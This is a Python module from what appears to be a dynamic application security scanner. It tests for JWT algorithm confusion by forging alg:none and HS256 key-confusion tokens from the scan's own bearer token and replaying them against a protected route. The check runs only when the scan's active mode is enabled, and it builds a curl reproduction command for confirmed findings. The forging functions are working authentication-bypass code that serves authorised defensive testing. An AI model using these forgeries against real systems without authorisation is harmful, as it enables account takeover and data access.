"""JWT algorithm confusion (Phase 3, item 5 of the dynamic-check catalog).

Every other check in this engine is session-agnostic — it probes target_url
with a crafted request and inspects the response. This one is different: it
forges variants of the scan's *own* bearer token and replays them against a
protected route, so it needs the session's real JWT, not just a URL. That's
why it lives in its own module (same reasoning as ssrf_probe.py/
dom_xss_probe.py) and is invoked directly by scan_service.py rather than
through checks.py's generic run_payload_checks dispatch — DastSession's
browser_auth_state() is the one place the session's raw Authorization header
is already exposed (built for the headless-browser crawler), reused here for
the same "don't duplicate where the auth material lives" reason.

Two forged variants, both replayed unauthenticated (no real credentials) so
a 2xx response can only mean the forged token itself was accepted:
  - alg:none — sets the JWT header's "alg" to "none" and drops the
    signature entirely. A server that trusts the client-supplied algorithm
    (rather than pinning to the one it actually issued) accepts this
    outright — the textbook JWT forgery.
  - HS256 key-confusion — only attempted when the real token is RS*/ES*
    (asymmetric) signed. If the target publishes its RSA public key (tried
    against a few conventional JWKS paths — best-effort, same "skip rather
    than guess" discipline as bridge.py's route resolution), a forged
    token is HMAC-signed *using that public key's PEM bytes as the HMAC
    secret*. A server that blindly uses the "alg" header to decide HS256
    vs RS256 verification (instead of pinning the expected algorithm)
    treats the public key as a valid HMAC secret and accepts it.

A 2xx on the forged-token replay, matching the real token's own baseline
success, is direct reproduced-impact proof — no oracle escalation needed:
either the server verified a token it should have rejected, or it didn't.
"""
import base64
import hashlib
import hmac
import json
import logging
from typing import Dict, Optional, Tuple
from urllib.parse import urlsplit

from app.domain.analysis.dast.findings import DynamicFinding
from app.domain.analysis.dast.session import DastSession
from app.domain.analysis.dast.verdict import Verdict

logger = logging.getLogger(__name__)

RULE_ID = "JWT_WEAKNESS_LIVE"
DEFAULT_CONTROL_ID = "V3.5.3"

# Conventional JWKS discovery paths — best-effort, not a real OIDC client.
# The third one is an OpenID Connect discovery document whose own
# "jwks_uri" field points at the real JWKS location, one more indirection
# some providers use instead of a fixed /jwks.json path.
_JWKS_CANDIDATE_PATHS = ("/.well-known/jwks.json", "/jwks.json", "/.well-known/openid-configuration")


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _b64url_decode(s: str) -> bytes:
    padding = "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + padding)


def _decode_jwt_parts(token: str) -> Optional[Tuple[dict, dict]]:
    """Splits and decodes a JWT's header/payload — no signature
    verification at all, deliberately: this function exists to forge new
    tokens from the shape of a real one, not to validate it."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
    except Exception:
        return None
    if not isinstance(header, dict) or not isinstance(payload, dict):
        return None
    return header, payload


def _forge_alg_none(header: dict, payload: dict) -> str:
    forged_header = {**header, "alg": "none"}
    header_b64 = _b64url_encode(json.dumps(forged_header, separators=(",", ":")).encode())
    payload_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    # Trailing dot, empty signature segment — the most common alg:none
    # encoding; some verifiers instead expect the dot omitted entirely,
    # but this is the shape the JWT spec's own compact-serialization
    # grammar describes for an empty signature.
    return f"{header_b64}.{payload_b64}."


def _forge_hs256_key_confusion(header: dict, payload: dict, hmac_key: bytes) -> str:
    forged_header = {**header, "alg": "HS256"}
    header_b64 = _b64url_encode(json.dumps(forged_header, separators=(",", ":")).encode())
    payload_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{header_b64}.{payload_b64}".encode()
    signature = hmac.new(hmac_key, signing_input, hashlib.sha256).digest()
    return f"{header_b64}.{payload_b64}.{_b64url_encode(signature)}"


def _rsa_jwk_to_pem(jwk: dict) -> bytes:
    # Deferred import: cryptography is only needed for this one RSA-JWK ->
    # PEM conversion, same "optional heavy dependency" posture
    # browser_crawler.py takes with playwright.
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.primitives.asymmetric import rsa

    n = int.from_bytes(_b64url_decode(jwk["n"]), "big")
    e = int.from_bytes(_b64url_decode(jwk["e"]), "big")
    public_key = rsa.RSAPublicNumbers(e, n).public_key()
    return public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )


async def _discover_rsa_public_key_pem(session: DastSession, target_url: str) -> Optional[bytes]:
    origin = "{0.scheme}://{0.netloc}".format(urlsplit(target_url))
    for path in _JWKS_CANDIDATE_PATHS:
        try:
            resp = await session.request_unauthenticated("GET", origin + path)
        except Exception:
            continue
        if resp.status_code != 200:
            continue
        try:
            data = resp.json()
        except Exception:
            continue

        if path.endswith("openid-configuration"):
            jwks_uri = data.get("jwks_uri")
            if not jwks_uri:
                continue
            try:
                jwks_resp = await session.request_unauthenticated("GET", jwks_uri)
                data = jwks_resp.json()
            except Exception:
                continue

        for jwk in data.get("keys") or []:
            if jwk.get("kty") == "RSA" and jwk.get("n") and jwk.get("e"):
                try:
                    return _rsa_jwk_to_pem(jwk)
                except Exception:
                    continue
    return None


async def run_jwt_probe(
    session: DastSession,
    target_url: str,
    *,
    control_id: str = DEFAULT_CONTROL_ID,
    severity: str = "critical",
    active_mode: bool = False,
) -> DynamicFinding:
    """Forges alg:none (and, best-effort, HS256 key-confusion) variants of
    the scan's own bearer JWT and replays each against target_url with no
    real credentials attached. requires_active_mode: forging and replaying
    a token against a protected route is a real auth-bypass attempt, same
    risk class as CSRF_TOKEN_NOT_VALIDATED/SQL_INJECTION_LIVE.
    """
    if not active_mode:
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.SKIPPED_REQUIRES_ACTIVE_AUTHORIZATION,
            rule_id=RULE_ID, url=target_url, method="GET", severity=severity,
            note="Forging and replaying a JWT against a protected route is a real auth-bypass attempt "
                 "and active_mode was not enabled for this scan",
            confidence=1.0,
        )

    _cookies, headers = session.browser_auth_state()
    auth_header = headers.get("Authorization", "")
    if not auth_header.lower().startswith("bearer "):
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.NOT_CONFIGURED, rule_id=RULE_ID, url=target_url,
            method="GET", severity=severity,
            note="This scan has no bearer-token session configured, so there's no JWT to forge variants of",
            confidence=1.0,
        )

    parsed = _decode_jwt_parts(auth_header.split(" ", 1)[1].strip())
    if parsed is None:
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.NOT_CONFIGURED, rule_id=RULE_ID, url=target_url,
            method="GET", severity=severity,
            note="The configured bearer token isn't a 3-part JWT — nothing to forge",
            confidence=0.8,
        )
    header, payload = parsed

    try:
        baseline_resp = await session.request("GET", target_url, follow_redirects=False)
    except Exception as exc:
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.NOT_TESTED, rule_id=RULE_ID, url=target_url,
            method="GET", severity=severity,
            note=f"Authenticated baseline request failed: {session.redact(str(exc))}", confidence=0.2,
        )
    if not (200 <= baseline_resp.status_code < 300):
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.NOT_TESTED, rule_id=RULE_ID, url=target_url,
            method="GET", severity=severity,
            note=f"Authenticated request itself returned {baseline_resp.status_code} — no confirmed-reachable "
                 f"protected route to test a forged token against",
            confidence=0.25,
            proof={"baseline_status": baseline_resp.status_code},
        )

    forged_variants = [("alg_none", _forge_alg_none(header, payload))]
    alg = str(header.get("alg", "")).upper()
    if alg.startswith("RS") or alg.startswith("ES"):
        pem = await _discover_rsa_public_key_pem(session, target_url)
        if pem is not None:
            forged_variants.append(("hs256_key_confusion", _forge_hs256_key_confusion(header, payload, pem)))

    attempted_variants = []
    for variant_name, forged_token in forged_variants:
        try:
            forged_resp = await session.request_unauthenticated(
                "GET", target_url, headers={"Authorization": f"Bearer {forged_token}"}, follow_redirects=False,
            )
        except Exception:
            continue
        attempted_variants.append({"variant": variant_name, "status": forged_resp.status_code})
        if 200 <= forged_resp.status_code < 300:
            return DynamicFinding(
                control_id=control_id, verdict=Verdict.CONFIRMED, rule_id=RULE_ID, url=target_url,
                method="GET", severity=severity,
                note=f"A forged JWT ({variant_name}) was accepted on a protected route — the target "
                     f"returned {forged_resp.status_code}, the same success shape as the real "
                     f"authenticated request ({baseline_resp.status_code}), with no real credentials "
                     f"attached. The server does not correctly validate the token's signature/algorithm",
                confidence=0.9, evidence_type="data_exfil",
                payload=session.redact(forged_token),
                reproduction=f"curl -s '{target_url}' -H 'Authorization: Bearer {forged_token}'",
                proof={
                    "variant": variant_name, "forged_status": forged_resp.status_code,
                    "baseline_status": baseline_resp.status_code,
                },
            )

    tried = "alg:none" + (", HS256 key-confusion" if len(forged_variants) > 1 else "")
    return DynamicFinding(
        control_id=control_id, verdict=Verdict.PASS, rule_id=RULE_ID, url=target_url, method="GET",
        severity=severity,
        note=f"No forged JWT variant ({tried}) was accepted on the protected route",
        confidence=0.5, evidence_type="data_exfil",
        proof={"baseline_status": baseline_resp.status_code, "attempted_variants": attempted_variants},
    )
